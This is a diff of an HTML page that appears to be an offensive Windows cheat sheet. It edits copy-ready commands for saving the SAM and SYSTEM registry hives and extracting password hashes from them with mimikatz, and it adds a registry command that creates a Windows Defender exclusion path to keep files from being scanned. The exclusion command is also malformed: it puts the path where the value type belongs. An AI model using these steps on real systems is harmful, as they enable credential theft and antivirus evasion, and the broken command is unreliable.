@@ -141,6 +141,22 @@
     </ul>
     
 
+    
+    <ul>
+    
+        <li><a class="" href="#get-system-information">Get system information</a></li>
+    
+    </ul>
+    
+
+    
+    <ul>
+    
+        <li><a class="" href="#check-defender-exclusion-path">Check Defender exclusion path</a></li>
+    
+    </ul>
+    
+
     </ul>
                 </li>
                 <li class="">
@@ -586,14 +602,17 @@ C:\Program Files (x86)\Microsoft Office\root\vfs\ProgramFilesX86\Microsoft Analy
 </code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="sqldumper.exe &lt;PID&gt; 0 0x01100:40
 ">    Copy  </button></div></div>
 <h3 id="sam-and-system-backup">SAM and SYSTEM backup</h3>
-<div class="clipboard-content">  <pre><code class="language-bash">$ reg save HKLM\SYSTEM SystemBkup.hiv
-$ reg save HKLM\SAM SamBkup.hiv
-</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="$ reg save HKLM\SYSTEM SystemBkup.hiv
-$ reg save HKLM\SAM SamBkup.hiv
+<p>You can dump the hives from a running Windows machine with the <code>reg</code> command:</p>
+<div class="clipboard-content">  <pre><code class="language-powershell">reg save HKLM\SYSTEM SystemBkup.hiv
+reg save HKLM\SAM SamBkup.hiv
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="reg save HKLM\SYSTEM SystemBkup.hiv
+reg save HKLM\SAM SamBkup.hiv
 ">    Copy  </button></div></div>
-<p>Then with <code>mimikatz</code> you can recover the hashes:</p>
-<div class="clipboard-content">  <pre><code class="language-bash">$ lsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv
-</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="$ lsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv
+<p>On the hard-drive, the files are stored in <code>C:\Windows\System32\config</code>. Even
+<code>nt authority\system</code> cannot copy those files.</p>
+<p>With <code>mimikatz</code> you can recover the hashes:</p>
+<div class="clipboard-content">  <pre><code class="language-powershell">lsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="lsadump::sam /system:SystemBkup.hiv /sam:SamBkup.hiv
 ">    Copy  </button></div></div>
 <h3 id="calculate-ntlm-hash">Calculate NTLM hash</h3>
 <div class="clipboard-content">  <pre><code class="language-python">import hashlib
@@ -754,6 +773,37 @@ cached files of the process in the two directories:</p>
 %USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData
 </code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content
 %USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\MetaData
+">    Copy  </button></div></div>
+<h2 id="system-information">System information</h2>
+<h3 id="get-system-information">Get system information</h3>
+<p>The command <code>systeminfo</code> lists the information about the system: Hostname,
+OS version, System type, Domain, Hotfixs, network cards, ...</p>
+<p>Also, you can read the log files from <code>%WINDIR%\inf</code> to get basic info:</p>
+<div class="clipboard-content">  <pre><code class="language-batch">type %WINDIR%\inf\setupapi.setup.log
+
+[Device Install Log]
+     OS Version = 10.0.19041
+     Service Pack = 0.0
+     Suite = 0x0100
+     ProductType = 1
+     Architecture = amd64
+...
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="type %WINDIR%\inf\setupapi.setup.log
+
+[Device Install Log]
+     OS Version = 10.0.19041
+     Service Pack = 0.0
+     Suite = 0x0100
+     ProductType = 1
+     Architecture = amd64
+...
+">    Copy  </button></div></div>
+<h2 id="windows-defender">Windows Defender</h2>
+<h3 id="check-defender-exclusion-path">Check Defender exclusion path</h3>
+<p>The registry node <code>HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths</code>
+contains the exclusions paths. You can add your own to prevent scanning:</p>
+<div class="clipboard-content">  <pre><code class="language-powershell">reg ADD &quot;HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths&quot; /f /t &quot;C:\Path\To\Exclude&quot; /d 0
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="reg ADD &quot;HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths&quot; /f /t &quot;C:\Path\To\Exclude&quot; /d 0
 ">    Copy  </button></div></div>
             
           </div>
